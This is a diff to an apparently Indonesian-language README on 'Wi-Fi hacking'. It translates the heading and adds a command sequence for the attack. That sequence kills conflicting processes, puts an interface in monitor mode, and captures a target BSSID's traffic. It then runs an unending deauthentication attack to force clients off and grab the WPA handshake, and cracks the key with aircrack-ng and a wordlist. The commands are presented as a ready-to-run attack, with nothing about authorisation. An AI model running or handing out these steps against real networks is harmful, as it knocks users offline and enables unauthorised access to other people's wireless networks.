@@ -1,4 +1,4 @@
-## WI-FI HACKING
+## Peretasan WI-FI
 
 ## Peralatan
 
@@ -63,3 +63,23 @@ $ ./instal.sh
 > Setelah memastikan semua peralatan yang diperlukan untuk melakukan peretasan Wi-Fi sudah tersedia, langkah-langkah berikut dapat diikuti untuk menjalankan proses peretasan Wi-Fi.
 
 ## Proses peretasan WI-FI
+
+```
+# Memastikan tidak ada konflik dengan proses lain yang menggunakan Wi-Fi
+$ sudo airmon-ng check kill
+
+# Memulai mode monitor pada antarmuka Wi-Fi yang dipilih
+$ sudo airmon-ng start [interface]
+
+# Menampilkan jaringan Wi-Fi yang tersedia dan informasi lainnya
+$ sudo airodump-ng [interface]
+
+# Merekam data jaringan Wi-Fi tertentu dengan menentukan BSSID, saluran, dan file output
+$ sudo airodump-ng --bssid [alamat_BSSID] --channel [channel] --write [output] [interface]
+
+# Melakukan serangan deauth untuk memaksa perangkat terhubung ulang dan merekam handshake
+$ sudo aireplay-ng --deauth 0 -a [alamat_BSSID] [interface]
+
+# Mengeksekusi aircrack-ng untuk menguraikan kunci dengan menggunakan wordlist
+$ sudo aircrack-ng -a2 --wordlist [wordlist] [handshake file]
+```
